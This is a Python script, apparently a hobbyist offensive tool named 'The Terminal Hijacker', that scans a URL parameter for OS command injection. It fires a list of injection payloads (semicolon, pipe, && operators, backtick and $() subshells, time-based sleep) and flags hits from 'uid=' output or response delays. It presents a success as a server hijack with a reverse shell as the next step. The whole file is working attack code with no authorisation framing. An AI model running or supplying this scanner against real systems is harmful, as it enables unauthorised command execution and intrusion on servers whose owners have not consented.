import requests
import sys
import time

def hunt_cmd_injection(target_url):
    print(f"\n[*] Bhai, starting The Terminal Hijacker: OS Command Injection Scanner...")
    print(f"[*] Target Parameter injected at -> {target_url}\n")
    print("==================================================")

    # The Hacker's Dictionary of OS Command Payloads
    # We use basic commands (whoami, id) and time-based commands (sleep)
    payloads = {
        "Semicolon Basic": "; id",
        "Pipe Basic": "| whoami",
        "AND Operator": "&& uname -a",
        "Subshell Execution": "`id`",
        "Subshell Execution v2": "$(whoami)",
        "Time-Based Semicolon": "; sleep 5",
        "Time-Based Pipe": "| sleep 5"
    }

    found_vuln = False

    print("[*] Firing Command Injection payloads into the backend terminal...\n")

    for attack_name, payload in payloads.items():
        # Injecting payload where 'FUZZ' is written in the URL
        attack_url = target_url.replace("FUZZ", payload)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CMD-Hijacker/1.0"
        }

        try:
            print(f"[*] Testing: {attack_name} -> {payload}")
            
            # Record start time to detect Time-Based (Blind) Injection
            start_time = time.time()
            
            response = requests.get(attack_url, headers=headers, timeout=10)
            text = response.text.lower()
            
            response_time = time.time() - start_time

            # The Magic Checks:
            # 1. Did the server output 'uid=' (from 'id' command) or 'linux' (from uname)?
            # 2. Did the server pause for exactly 5+ seconds because of our 'sleep 5' command?
            
            if "uid=" in text or "gid=" in text or "linux" in text:
                print(f"\n   [!!!] JACKPOT 🎯 CRITICAL OS COMMAND INJECTION FOUND!")
                print(f"   [!!!] Attack Type: {attack_name} (Visible Output)")
                print(f"   [!!!] Server executed our payload and returned the terminal output!")
                print(f"   [!!!] Data Snippet: {response.text[:100].strip()}...")
                found_vuln = True
                break
                
            elif response_time >= 5:
                print(f"\n   [!!!] JACKPOT 🎯 BLIND OS COMMAND INJECTION FOUND!")
                print(f"   [!!!] Attack Type: {attack_name} (Time-Based)")
                print(f"   [!!!] The server slept for {round(response_time, 2)} seconds.")
                print(f"   [!!!] The command executed successfully in the background!")
                found_vuln = True
                break

        except requests.exceptions.ReadTimeout:
             # If the timeout hits exactly because of a long sleep command
             print(f"\n   [!!!] JACKPOT 🎯 BLIND COMMAND INJECTION (Timeout Reached)!")
             print(f"   [!!!] The server completely stalled due to our sleep command.")
             found_vuln = True
             break
        except requests.exceptions.RequestException:
             print(f"   [-] Connection Error. Skipping...")

    print("\n==================================================")
    if found_vuln:
        print("[+] Scan Complete! Direct Server Terminal Hijack achieved. Next step: Spawning a Reverse Shell! 💀")
    else:
        print("[-] Scan Complete. Input is properly sanitized. No command execution detected.")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(sys.argv) != 2:
        print("Usage: python3 cmd_injector.py <Target_URL_with_FUZZ>")
        print("Example: python3 cmd_injector.py 'http://target.com/ping?ip=127.0.0.1FUZZ'")
        sys.exit(1)
        
    url = sys.argv[1]
    
    if "FUZZ" not in url:
        print("[-] ERROR: Target URL must contain the word 'FUZZ' where the payload should go.")
        sys.exit(1)
        
    hunt_cmd_injection(url)
